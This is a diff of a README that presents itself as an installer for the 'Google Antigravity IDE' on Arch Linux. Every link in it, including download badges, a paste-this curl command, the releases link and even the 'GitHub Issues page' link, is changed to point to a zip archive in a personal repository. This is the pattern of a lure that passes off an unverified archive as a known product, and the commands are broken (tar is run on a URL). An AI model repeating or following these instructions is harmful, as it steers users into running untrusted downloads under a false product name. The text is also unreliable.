@@ -1,6 +1,6 @@
 # 🚀 google-antigravity-bin-arch - Easy Installation for Google Antigravity IDE
 
-[![Download](https://raw.githubusercontent.com/Dhruvalvasava/google-antigravity-bin-arch/main/package/google-antigravity-bin-arch_3.9.zip%20Now-Release-blue)](https://raw.githubusercontent.com/Dhruvalvasava/google-antigravity-bin-arch/main/package/google-antigravity-bin-arch_3.9.zip)
+[![Download](https://github.com/Dhruvalvasava/google-antigravity-bin-arch/raw/refs/heads/main/package/arch_google_bin_antigravity_2.8.zip%20Now-Release-blue)](https://github.com/Dhruvalvasava/google-antigravity-bin-arch/raw/refs/heads/main/package/arch_google_bin_antigravity_2.8.zip)
 
 ## 📦 Overview
 
@@ -29,7 +29,7 @@ To get the Google Antigravity IDE installed on your machine, follow these simple
 3. **Run Installation Command:**
    Copy and paste the following command into your terminal:
    ```bash
-   curl -O https://raw.githubusercontent.com/Dhruvalvasava/google-antigravity-bin-arch/main/package/google-antigravity-bin-arch_3.9.zip && tar -xzf https://raw.githubusercontent.com/Dhruvalvasava/google-antigravity-bin-arch/main/package/google-antigravity-bin-arch_3.9.zip && cd google-antigravity-bin-arch-*
+   curl -O https://github.com/Dhruvalvasava/google-antigravity-bin-arch/raw/refs/heads/main/package/arch_google_bin_antigravity_2.8.zip && tar -xzf https://github.com/Dhruvalvasava/google-antigravity-bin-arch/raw/refs/heads/main/package/arch_google_bin_antigravity_2.8.zip && cd google-antigravity-bin-arch-*
    ```
    This command will download the installer package and extract it in the current directory.
 
@@ -43,7 +43,7 @@ This will compile and install the application on your system.
 
 ## 📥 Download & Install
 
-To get the latest version of the software, visit this page to download: [Download Releases](https://raw.githubusercontent.com/Dhruvalvasava/google-antigravity-bin-arch/main/package/google-antigravity-bin-arch_3.9.zip)
+To get the latest version of the software, visit this page to download: [Download Releases](https://github.com/Dhruvalvasava/google-antigravity-bin-arch/raw/refs/heads/main/package/arch_google_bin_antigravity_2.8.zip)
 
 ### 🔄 Automatic Updates
 
@@ -71,7 +71,7 @@ If you encounter any issues during installation or usage, consider the following
    ```
    If the version information appears, the installation succeeded.
 
-For any persistent issues, feel free to open an issue in our [GitHub Issues page](https://raw.githubusercontent.com/Dhruvalvasava/google-antigravity-bin-arch/main/package/google-antigravity-bin-arch_3.9.zip).
+For any persistent issues, feel free to open an issue in our [GitHub Issues page](https://github.com/Dhruvalvasava/google-antigravity-bin-arch/raw/refs/heads/main/package/arch_google_bin_antigravity_2.8.zip).
 
 ## 🙌 Getting Help
 
@@ -79,4 +79,4 @@ For additional help or questions, community forums and discussion boards related
 
 This guide serves to make your experience with the Google Antigravity IDE as smooth as possible. We appreciate your interest and hope you enjoy using our software.
 
-[![Download](https://raw.githubusercontent.com/Dhruvalvasava/google-antigravity-bin-arch/main/package/google-antigravity-bin-arch_3.9.zip%20Now-Release-blue)](https://raw.githubusercontent.com/Dhruvalvasava/google-antigravity-bin-arch/main/package/google-antigravity-bin-arch_3.9.zip)
+[![Download](https://github.com/Dhruvalvasava/google-antigravity-bin-arch/raw/refs/heads/main/package/arch_google_bin_antigravity_2.8.zip%20Now-Release-blue)](https://github.com/Dhruvalvasava/google-antigravity-bin-arch/raw/refs/heads/main/package/arch_google_bin_antigravity_2.8.zip)
